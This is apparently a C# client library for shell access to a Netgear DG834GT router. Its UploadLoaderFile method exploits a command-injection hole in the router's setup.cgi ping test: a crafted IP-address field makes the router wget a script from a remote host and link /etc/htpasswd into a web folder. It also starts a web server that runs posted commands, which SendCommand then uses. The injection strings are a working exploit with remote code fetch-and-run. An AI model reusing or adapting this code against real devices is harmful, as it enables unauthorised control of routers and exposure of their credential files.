using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace pHMb.Router
{
    /// <summary>
    /// Class to connect to the DG834GT router using HTTP
    /// </summary>
    public class RouterHttp
    {
        #region Private Methods
        private void UploadLoaderFile()
        {
            // The GET string to send
            string[] queryString = new string[2];
            if (SkyCompatibilityMode)
            {
                queryString[0] = "/setup.cgi?PATH=/bin/:/usr/sbin/:/sbin/:/usr/bin;mkdir+/tmp/new_web;rm+/tmp/new_web/do_cmd.sh;wget+-P+/tmp/new_web+http://" + HttpServerUsername + ":" + HttpServerPassword + "@${1}:" + HttpServerPort.ToString() + "/do_cmd.sh;chmod+777+/tmp/new_web/do_cmd.sh;ln+/etc/htpasswd+/tmp/new_web/.htpasswd;"
                     + "&todo=ping_test&next_file=diagping.htm"
                     + "&c4_IPAddr="
                     + Uri.EscapeDataString("192.168.0.1>/dev/null;(IFS=+;/bin/echo>/tmp/ex.sh ${QUERY_STRING%%&to*};/bin/sh /tmp/ex.sh ${REMOTE_ADDR}) >&1 2>&1;");


                queryString[1] = "/setup.cgi?PATH=/bin/:/usr/sbin/:/sbin/:/usr/bin;kill+`cat+/tmp/mini_httpd.pid`;mini_httpd+-p+8324+-d+/tmp/new_web/+-c+\"**sh\"+-i+/tmp/mini_httpd.pid+>+/dev/null+2>+/dev/null"
                    + "&todo=ping_test&next_file=diagping.htm"
                    + "&c4_IPAddr="
                    + Uri.EscapeDataString("192.168.0.1>/dev/null;(IFS=+;/bin/echo>/tmp/ex.sh ${QUERY_STRING%%&to*};/bin/sh /tmp/ex.sh ${REMOTE_ADDR}) >&1 2>&1;");

            }
            else
            {
                queryString[0] = "/setup.cgi?PATH=/bin/:/usr/sbin/:/sbin/:/usr/bin;+mkdir+/tmp/new_web;+rm+/tmp/new_web/do_cmd.sh;+wget+-P+/tmp/new_web+\"http://" + HttpServerUsername + ":" + HttpServerPassword + "@${1}:" + HttpServerPort.ToString() + "/do_cmd.sh\";+chmod+777+/tmp/new_web/do_cmd.sh;ln+/etc/htpasswd+/tmp/new_web/.htpasswd;+kill+`cat+/tmp/mini_httpd.pid`;+sh+-c+\"mini_httpd+-p+8324+-d+/tmp/new_web/+-c+**sh+-i+/tmp/mini_httpd.pid+>+/dev/null+2>+/dev/null\""
                   + "&todo=ping_test&next_file=diagping.htm"
                   + "&c4_IPAddr="
                   + Uri.EscapeDataString("2>/dev/null; (IFS=+;  /bin/echo ${QUERY_STRING%%&to*} > /tmp/ex.sh; /bin/sh /tmp/ex.sh ${REMOTE_ADDR}) 2>&1");
            }

            try
            {
                for (int i = 0; i <= (SkyCompatibilityMode ? 1 : 0); i++)
                {
                    // I'm using a raw socket here because the setup.cgi seems to produce headers that HttpWebRequest doesn't like...
                    using (TcpClient httpClient = new TcpClient(Host, 80))
                    {
                        using (NetworkStream httpStream = httpClient.GetStream())
                        {
                            // Set up reqest header
                            byte[] requestBin = Encoding.ASCII.GetBytes(String.Format(
                                "GET {0} HTTP/1.1\r\nHost: {1}\r\nConnection: close\r\nAuthorization: Basic {2}\r\n\r\n",
                                queryString[i],
                                Host,
                                Convert.ToBase64String(Encoding.ASCII.GetBytes(String.Format("{0}:{1}", Username, Password)))
                                ));

                            // Write header
                            httpStream.Write(requestBin, 0, requestBin.Length);

                            // Read back response
                            byte[] bufferBytes = new byte[1];
                            List<byte> lOutput = new List<byte>();
                            while (httpStream.Read(bufferBytes, 0, 1) != 0)
                            {
                                lOutput.Add(bufferBytes[0]);
                            }

                            string output = Encoding.ASCII.GetString(lOutput.ToArray());


                            if (output.Contains("401 Unauthorized"))
                            {
                                OnConnectionError(null, true);
                            }
                        }
                    }
                }
            }
            catch (SocketException) { }
        } 
        #endregion

        #region Public Properties
        public string Username { get; set; }
        public string Password { get; set; }
        public string Host { get; set; }
        public int HttpServerPort { get; set; }
        public string HttpServerPassword { get; set; }
        public string HttpServerUsername { get; set; }
        public bool Connected { get; private set; }
        public bool SkyCompatibilityMode { get; set; }
        #endregion

        #region Public Events
        public class ConnectionErrorEventArgs : EventArgs
        {
            public Exception Exception;
            public bool isIncorrectCredentials;
        }
        public event EventHandler<ConnectionErrorEventArgs> ConnectionError;
        private void OnConnectionError(Exception exception, bool isIncorrectCredentials)
        {
            if (ConnectionError != null)
            {
                ConnectionError.Invoke(this,
                    new ConnectionErrorEventArgs() { Exception = exception, isIncorrectCredentials = isIncorrectCredentials });
            }
        }

        public event EventHandler ConnectionSuccess;
        private void OnConnectionSuccess()
        {
            if (ConnectionSuccess != null)
            {
                ConnectionSuccess.Invoke(this,EventArgs.Empty);
            }
        }
        #endregion

        #region Public Methods
        public RouterHttp(string username, string password, string host, int httpServerPort, string httpServerUsername, string httpServerPassword, bool skyCompatibilityMode)
        {
            Username = username;
            Password = password;
            Host = host;
            HttpServerPort = httpServerPort;
            HttpServerUsername = httpServerUsername;
            HttpServerPassword = httpServerPassword;
            SkyCompatibilityMode = skyCompatibilityMode;
        }

        public string SendCommand(string command)
        {
            string output;
            StreamReader responseReader;
            StreamWriter stOut;

            // Loop trying to send command
            int i = 0;
            while (true)
            {
                try
                {
                    Uri commandUri = new UriBuilder("http", Host, 8324, "/do_cmd.sh").Uri;

                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(commandUri);

                    request.Credentials = new NetworkCredential(Username, Password, "");
                    request.Timeout = 10000;
                    request.Method = "POST";

                    request.ContentLength = command.Length + 1;

                    // Sent command via 'post'
                    using (stOut = new StreamWriter(request.GetRequestStream(), System.Text.Encoding.ASCII))
                    {
                        stOut.Write(command + "\n");
                        stOut.Flush();
                    }

                    // Get reponse
                    using (responseReader = new StreamReader(request.GetResponse().GetResponseStream()))
                    {
                        output = responseReader.ReadToEnd();
                        responseReader.Close();
                    }
                    Connected = true;
                    i = 0;
                    OnConnectionSuccess();
                    break;
                }
                catch (System.Net.WebException ex)
                {
                    // Somthing went wrong accessing the command interface! Try re-uploading the loader file
                    Connected = false;

                    if (ex.Message.Contains("(401) Unauthorized"))
                    {
                        OnConnectionError(ex, true);
                    }
                    else
                    {
                        OnConnectionError(ex, false);
                    }

                    UploadLoaderFile();

                    if (i > 2)
                    {
                        throw;
                    }
                    else
                    {
                        i++;
                    }
                }
            }

            return output;
        } 
        #endregion
    }
}
